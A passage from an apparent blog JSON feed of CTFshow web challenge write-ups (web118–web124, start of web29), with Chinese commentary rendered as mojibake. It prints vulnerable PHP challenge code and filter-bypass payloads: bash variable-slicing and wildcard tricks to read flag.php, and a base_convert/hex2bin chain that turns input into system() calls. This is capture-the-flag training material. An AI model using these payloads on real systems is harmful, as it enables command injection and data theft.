            "content_html": "<h2 id=\"web118\"><a class=\"anchor\" href=\"#web118\">#</a> web118</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101124411538.png\" alt=\"image-20221101124411538\" /></p>\n<p>å·²ç»çŸ¥é“ flag åœ¨ flag.php ä¸­ï¼Œæƒ³åŠæ³•æ‰“å¼€æ–‡ä»¶å°±è¡Œ</p>\n<p>è¿™é‡Œå°†å°å†™å­—æ¯å’Œæ•°å­—éƒ½è¿‡æ»¤äº†ï¼Œä½¿ç”¨ bash çš„å†…ç½®å˜é‡è¿›è¡Œç»•è¿‡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101125816499.png\" alt=\"image-20221101125816499\" /></p>\n<p>é¢˜ç›®åº”è¯¥åœ¨ html ä¸‹é¢ï¼Œå¯ä»¥æ‹¿åˆ° lï¼ŒPATH ç»“å°¾æ˜¯ /bin æ‹¿åˆ° n</p>\n<p>å¯ä»¥ä½¿ç”¨ nl å‘½ä»¤</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">PATH</span><span class=\"token punctuation\">:</span><span class=\"token operator\">~</span><span class=\"token constant\">A</span><span class=\"token punctuation\">&#125;</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">PWD</span><span class=\"token punctuation\">:</span><span class=\"token operator\">~</span><span class=\"token constant\">A</span><span class=\"token punctuation\">&#125;</span><span class=\"token variable\">$IFS</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">.</span><span class=\"token operator\">??</span><span class=\"token operator\">?</span>\n<span class=\"token comment\">//nl flag.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101130512076.png\" alt=\"image-20221101130512076\" /></p>\n<h2 id=\"web119\"><a class=\"anchor\" href=\"#web119\">#</a> web119</h2>\n<p>ä¸Šé¢çš„ payload ç”¨ä¸äº†äº†ï¼Œå» bin ä¸‹è°ƒç”¨ cat å‘½ä»¤</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101131118761.png\" alt=\"image-20221101131118761\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;SHLVL&#125;       &#x2F;&#x2F;ä¸€èˆ¬æ˜¯ä¸€ä¸ªä¸ªä½æ•°\n$&#123;#SHLVL&#125;     &#x2F;&#x2F;1ï¼Œè¡¨ç¤ºç»“æœçš„å­—ç¬¦é•¿åº¦\n$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;       &#x2F;&#x2F;è¡¨ç¤º&#x2F;\n$&#123;USER&#125;        &#x2F;&#x2F;www-data\n$&#123;PHP_VERSION:~A&#125;       &#x2F;&#x2F;2\n$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125;         &#x2F;&#x2F;at<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101131535946.png\" alt=\"image-20221101131535946\" /></p>\n<h2 id=\"web120\"><a class=\"anchor\" href=\"#web120\">#</a> web120</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\>|\\'|\\`|\\||\\,/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">65</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;div align=\"center\">'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'you are so long , I dont like '</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/div>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;div align=\"center\">'</span><span class=\"token operator\">.</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/div>'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;div align=\"center\">evil input&lt;/div>'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>ç›¸å½“äºå‰ä¸¤å…³çš„æºç ç»™äº†ï¼ŒåŠ äº†ä¸€ä¸ªé•¿åº¦é™åˆ¶</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#96;$&#123;#&#125;&#96; ç›¸å½“äº0ï¼Œå¯çœç•¥ï¼Œæ„é€ ä¸€ä¸ªa&#x3D;&#x3D;ã€‹$&#123;USER:~A&#125;\n$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;USER:~A&#125; ????.???<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101132159304.png\" alt=\"image-20221101132159304\" /></p>\n<h2 id=\"web121\"><a class=\"anchor\" href=\"#web121\">#</a> web121</h2>\n<p>è¿‡æ»¤å¢åŠ äº†ï¼Œè¿˜æœ‰ä¸€ä¸ª PWD èƒ½ç”¨</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101132608193.png\" alt=\"image-20221101132608193\" /></p>\n<p>æ•°å­—è¿˜æ˜¯æœ‰æ–¹æ³•æ„å»ºçš„</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;#&#125;ä¸ºæ·»åŠ åˆ°shellçš„å‚æ•°ä¸ªæ•°\nrevå‘½ä»¤å°†æ–‡ä»¶ä¸­çš„æ¯è¡Œå†…å®¹ä»¥å­—ç¬¦ä¸ºå•ä½ååºè¾“å‡º\n$&#123;#IFS&#125;kalié‡Œæ˜¯4ï¼Œä¹Œç­å›¾æ˜¯3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h2 id=\"web124\"><a class=\"anchor\" href=\"#web124\">#</a> web124</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ± flag</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// ä¾‹å­ c=20-1</span>\n    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">80</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"å¤ªé•¿äº†ä¸ä¼šç®—\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token variable\">$blacklist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\t'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\r'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\''</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\['</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'\\]'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$blacklist</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$blackitem</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$blackitem</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/m'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// å¸¸ç”¨æ•°å­¦å‡½æ•° http://www.w3school.com.cn/php/php_ref_math.asp</span>\n    <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'abs'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'acos'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'acosh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'asin'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'asinh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'atan2'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'atan'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'atanh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'base_convert'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'bindec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'ceil'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cos'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'cosh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'decbin'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'dechex'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'decoct'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'deg2rad'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'exp'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'expm1'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'floor'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'fmod'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'getrandmax'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'hexdec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'hypot'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'is_finite'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'is_infinite'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'is_nan'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'lcg_value'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log10'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log1p'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'max'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'min'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'mt_getrandmax'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'mt_rand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'mt_srand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'octdec'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'pi'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'pow'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rad2deg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'rand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'round'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sin'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sinh'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'sqrt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'srand'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'tan'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'tanh'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$used_funcs</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$used_funcs</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>\n    <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'echo '</span><span class=\"token operator\">.</span><span class=\"token variable\">$content</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">é¢˜ä¸­å¯ç”¨äºè¿›åˆ¶è½¬æ¢çš„å‡½æ•°\n&#39;base_convert&#39;-ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢\n&#39;bindec&#39;-æŠŠäºŒè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶\n&#39;decbin&#39;-æŠŠåè¿›åˆ¶è½¬è¿˜ä¸ºäºŒè¿›åˆ¶\n&#39;dechex&#39;-åè¿›åˆ¶è½¬16è¿›åˆ¶\n&#39;decoct&#39;-å…«è¿›åˆ¶è½¬16è¿›åˆ¶<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æƒ³åŠæ³•æ„é€ </p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">$_GET[a]($_GET[b]);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">[]è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨&#123;&#125;ä»£æ›¿ï¼Œ16è¿›åˆ¶æœ‰å­—æ¯ï¼Œå°†16è¿›åˆ¶è½¬10è¿›åˆ¶\næƒ³åˆ©ç”¨hex2bin()å®ç°è¿›åˆ¶ä¸å­—ç¬¦ä¸²ç›¸äº’ï¼Œä¹Ÿå¾—æ„å»ºä¸€ä¸‹\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_GET'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hex2bin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hex2bin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//37907361743hex2bin</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'_GET'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//echo base_convert('hex2bin',36,10);</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'37907361743'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">bin2hex</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_GET\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">hexdec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"5f474554\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">hex2bin</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1598506324\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//hex2bin5f4745541598506324_GET</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>å†å°†è¯­å¥æ‹¼æ¥ä¸€ä¸‹</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'37907361743'</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1598506324\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\næœ€åçš„payload\n<span class=\"token operator\">/</span><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token variable\">$pi</span><span class=\"token operator\">=</span><span class=\"token function\">base_convert</span><span class=\"token punctuation\">(</span><span class=\"token number\">37907361743</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token number\">1598506324</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$$pi</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">1</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$pi</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">2</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span><span class=\"token operator\">=</span>system<span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">=</span>ls<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221101152741080.png\" alt=\"image-20221101152741080\" /></p>\n",
            "tags": [
                "CTFshow",
                "rce"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "https://blog.xcu.icu/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "CTFshow-webå…¥é—¨å‘½ä»¤æ‰§è¡Œ",
            "date_published": "2022-10-31T16:00:00.000Z",
            "content_html": "<h2 id=\"web29\"><a class=\"anchor\" href=\"#web29\">#</a> web29</h2>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/flag/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-uri\" data-language=\"uri\"><code class=\"language-uri\"><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">c</span>=<span class=\"token value\">system('cat</span></span></span> f<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">ag.php')</span></span><span class=\"token pair-delimiter\">;</span></span>\n<span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token 